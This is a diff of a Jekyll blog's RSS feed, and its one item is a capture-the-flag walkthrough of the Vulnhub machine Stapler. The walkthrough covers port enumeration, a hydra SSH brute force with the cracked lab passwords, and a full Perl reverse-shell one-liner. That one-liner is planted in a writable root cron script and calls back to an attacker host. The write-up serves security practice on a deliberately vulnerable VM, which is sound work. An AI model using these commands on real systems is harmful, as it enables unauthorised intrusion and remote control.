@@ -2,29 +2,25 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>nothing special</title>
-    <description>While working on ctfs and boot-to-roots, I need to practice documentation,  this just happens to be the place where those are kept.
+    <description>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
 </description>
     <link>http://a.aronott.com/</link>
     <atom:link href="http://a.aronott.com/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Wed, 26 Jul 2017 21:40:47 -0600</pubDate>
-    <lastBuildDate>Wed, 26 Jul 2017 21:40:47 -0600</lastBuildDate>
-    <generator>Jekyll v3.0.1</generator>
+    <pubDate>Thu, 27 Jul 2017 16:28:09 -0600</pubDate>
+    <lastBuildDate>Thu, 27 Jul 2017 16:28:09 -0600</lastBuildDate>
+    <generator>Jekyll v3.5.1</generator>
     
       <item>
         <title>Stapler</title>
-        <description>&lt;h1 id=&quot;stapler&quot;&gt;Stapler&lt;/h1&gt;
-
-&lt;p&gt;Stapler is a boot-to-root vulnerable machine that was found on &lt;a href=&quot;https://www.vulnhub.com/entry/stapler-1,150/&quot;&gt;Vulnhub&lt;/a&gt;. The machine was not super difficult, however it does certainly reward enumeration. This is certainly not surprising given that the machine was created by g0tmi1k.&lt;/p&gt;
+        <description>&lt;p&gt;Stapler is a boot-to-root vulnerable machine that was found on &lt;a href=&quot;https://www.vulnhub.com/entry/stapler-1,150/&quot;&gt;Vulnhub&lt;/a&gt;. The machine was not super difficult, however it does certainly reward enumeration. This is certainly not surprising given that the machine was created by g0tmi1k.&lt;/p&gt;
 
 &lt;p&gt;This is by no means the only correct way to pass this machine and gain root access, it is just the way I found to do it.&lt;/p&gt;
 
 &lt;p&gt;First, start with nmap:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -p- 192.168.1.116
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p- 192.168.1.116&lt;/code&gt;&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;ports open: PORT STATE SERVICE
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ports open: PORT STATE SERVICE
 21/tcp open ftp
 22/tcp open ssh
 53/tcp open domain
@@ -32,59 +28,61 @@
 139/tcp open netbios-ssn
 666/tcp open doom
 3306/tcp open mysql
-12380/tcp open unknown&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
+12380/tcp open unknown
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 &lt;p&gt;This returns a list of open ports that can be used to further enumerate each service.&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;Port 21:&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;Connecting to FTP we are presented a message:&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;220-
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;220-
 220-|-----------------------------------------------------------------------------------------|
 220-| Harry, make sure to update the banner when you get a chance to show who has access here |
 220-|-----------------------------------------------------------------------------------------|
 220-
-220&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/stapler/image.png&quot; alt=&quot;img of ftp output&quot; /&gt;&lt;/p&gt;
+220
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image.png&quot; alt=&quot;img of ftp output&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;We are able to login anonymously and find that there is a file available for download.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/stapler/image2.png&quot; alt=&quot;img of ftp output&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image2.png&quot; alt=&quot;img of ftp output&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Download the note and read it:
 Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/stapler/image3.png&quot; alt=&quot;img of ftp output&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image3.png&quot; alt=&quot;img of ftp output&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Using nmap to get the version of FTP: vsftpd 2.0.8 or later&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/stapler/image13.png&quot; alt=&quot;img of ftp output&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image13.png&quot; alt=&quot;img of ftp output&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;Port 22:&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;When using ssh to connect to the box, we see another message:&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;-----------------------------------------------------------------
-~ Barry, don&#39;t forget to put a message here ~
------------------------------------------------------------------&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----------------------------------------------------------------
+~ Barry, don't forget to put a message here ~
+-----------------------------------------------------------------
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 &lt;p&gt;using netcat, we can see that the ssh version is: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;Port 139:&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;enum4linux reveals quite a bit of information for this server, including a list of valid users and 2 mount points.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;# enum4linux 192.168.1.116
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# enum4linux 192.168.1.116
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jul 16 11:36:25 2017
 ==========================
 | Target Information     |
 ==========================
 Target ........... 192.168.1.116
 RID Range ........ 500-550,1000-1050
-Username ......... &#39;&#39;
-Password ......... &#39;&#39;
+Username ......... ''
+Password ......... ''
 Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
 ==========================================
@@ -147,49 +145,53 @@ S-1-22-1-1025 Unix User\kai (Local User)
 S-1-22-1-1026 Unix User\zoe (Local User)
 S-1-22-1-1027 Unix User\NATHAN (Local User)
 S-1-22-1-1028 Unix User\www (Local User)
-S-1-22-1-1029 Unix User\elly (Local User)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+S-1-22-1-1029 Unix User\elly (Local User)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;Port 666:&lt;/strong&gt;
+Using netcat to connect to port 666 we see a bunch of gibberish.&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Port 666:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image4.png&quot; alt=&quot;image of gibberish&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Using netcat to connect to port 666 we see a bunch of gibberish.&lt;/p&gt;
+&lt;p&gt;If we capture this gibberish out to a file.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/stapler/image4.png&quot; alt=&quot;image of gibberish&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image5.png&quot; alt=&quot;image of gibberish&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;If we capture this gibberish out to a file,
-&lt;img src=&quot;/img/stapler/image5.png&quot; alt=&quot;image of gibberish&quot; /&gt;
-We see that it’s a zip file.&lt;/p&gt;
+&lt;p&gt;We see that it’s a zip file.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/stapler/image6.png&quot; alt=&quot;img message2.jpg&quot; /&gt;
-This contains an interesting file message2.jpg.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image6.png&quot; alt=&quot;img message2.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This contains an interesting file message2.jpg.&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;Port 3306:&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;I don’t have a valid username or password for mysql, but I was able to find the mysql version using netcat.&lt;/p&gt;
 
-&lt;p&gt;5.7.12-0ubuntu1
-&lt;img src=&quot;/img/stapler/image7.png&quot; alt=&quot;img mysql version&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;5.7.12-0ubuntu1&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image7.png&quot; alt=&quot;img mysql version&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;Port 12380:&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;Using curl, I looked at http and https for this port to find that https was a bit more promising.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/stapler/image8.png&quot; alt=&quot;img curl 12380&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image8.png&quot; alt=&quot;img curl 12380&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/stapler/image9.png&quot; alt=&quot;img curl 12380 https&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image9.png&quot; alt=&quot;img curl 12380 https&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/stapler/image10.png&quot; alt=&quot;img browser 12380 https&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image10.png&quot; alt=&quot;img browser 12380 https&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;I ran gobuster to enumerate directories using a wordlist and found some interesting directories.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/stapler/image11.png&quot; alt=&quot;gobuster&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image11.png&quot; alt=&quot;gobuster&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;In announcements, there is a message that could lead to more information, but not super helpful to us right now.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/stapler/image12.png&quot; alt=&quot;announcements&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image12.png&quot; alt=&quot;announcements&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;phpmyadmin exposed is dangerous, however, since I still don’t have credentials to login there, I will leave this for a bit later.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/stapler/image20.png&quot; alt=&quot;announcements&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image20.png&quot; alt=&quot;announcements&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Looking at https://192.168.1.116:12380/phpmyadmin/doc/html/index.html I was able to determine the current version of phpmyadmin to be 4.5.4.1.&lt;/p&gt;
 
@@ -210,50 +212,45 @@ This contains an interesting file message2.jpg.&lt;/p&gt;
 
 &lt;h2 id=&quot;bruteforce&quot;&gt;Bruteforce&lt;/h2&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -L users.txt -P /usr/share/SecLists/Passwords/500-worst-passwords.txt 192.168.1.116 ssh
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hydra -L users.txt -P /usr/share/SecLists/Passwords/500-worst-passwords.txt 192.168.1.116 ssh&lt;/code&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/stapler/image14.png&quot; alt=&quot;Bruteforce&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image14.png&quot; alt=&quot;Bruteforce&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Now I have 3 accounts that I can use to ssh to the box.
-- JBare: cookie
-- MFrei: letmein
-- Drew: qwerty&lt;/p&gt;
+&lt;p&gt;Now I have 3 accounts that I can use to ssh to the box.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;JBare: cookie&lt;/li&gt;
+  &lt;li&gt;MFrei: letmein&lt;/li&gt;
+  &lt;li&gt;Drew: qwerty&lt;/li&gt;
+&lt;/ul&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/stapler/image15.png&quot; alt=&quot;access through ssh&quot; /&gt;
-Using the password (cookie) from above I was able to ssh to the machine.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image15.png&quot; alt=&quot;access through ssh&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using the password (cookie) from above I was able to ssh to the machine.&lt;/p&gt;
 
 &lt;p&gt;I then started with the enumeration steps on the box itself. https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ls -lart /etc/cron.d/*
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ls -lart /etc/cron.d/*&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;logrotate looked interesting as it calls to a script using the root user.
-&lt;img src=&quot;/img/stapler/image16.png&quot; alt=&quot;logrotate&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/assets/images/stapler/image16.png&quot; alt=&quot;logrotate&quot; /&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ls -l /usr/local/sbin/cron-logrotate.sh
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ls -l /usr/local/sbin/cron-logrotate.sh&lt;/code&gt;&lt;/p&gt;
 
-cat /usr/local/sbin/cron-logrotate.sh
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cat /usr/local/sbin/cron-logrotate.sh&lt;/code&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/stapler/image17.png&quot; alt=&quot;logrotate&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image17.png&quot; alt=&quot;logrotate&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Seeing that I had permissions to write to a script that is run by the root user every 5 minutes got me super excited!&lt;/p&gt;
 
 &lt;p&gt;I added a reverse shell using perl to this script:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;perl -e &#39;use Socket;$i=&quot;192.168.1.124&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))) {open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;perl -e 'use Socket;$i=&quot;192.168.1.124&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))) {open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'&lt;/code&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/stapler/image18.png&quot; alt=&quot;reverse shell in script&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image18.png&quot; alt=&quot;reverse shell in script&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;All that was left was to create a netcat listener on my attacking machine to listen for the reverse shell :-)&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/stapler/image19.png&quot; alt=&quot;reverse shell connects&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image19.png&quot; alt=&quot;reverse shell connects&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;BOOM!&lt;/strong&gt;&lt;/p&gt;
 
@@ -262,8 +259,8 @@ cat /usr/local/sbin/cron-logrotate.sh
 &lt;p&gt;In the end there are quite a few more messages left around the system including some in the ssl certificate and the message2.jpg file (using strings to display this). Thank you g0tmi1k for the great boot2root VM.&lt;/p&gt;
 </description>
         <pubDate>Wed, 26 Jul 2017 19:34:00 -0600</pubDate>
-        <link>http://a.aronott.com/stapler.html</link>
-        <guid isPermaLink="true">http://a.aronott.com/stapler.html</guid>
+        <link>http://a.aronott.com/ctf/2017/07/26/stapler.html</link>
+        <guid isPermaLink="true">http://a.aronott.com/ctf/2017/07/26/stapler.html</guid>
         
         
         <category>ctf</category>
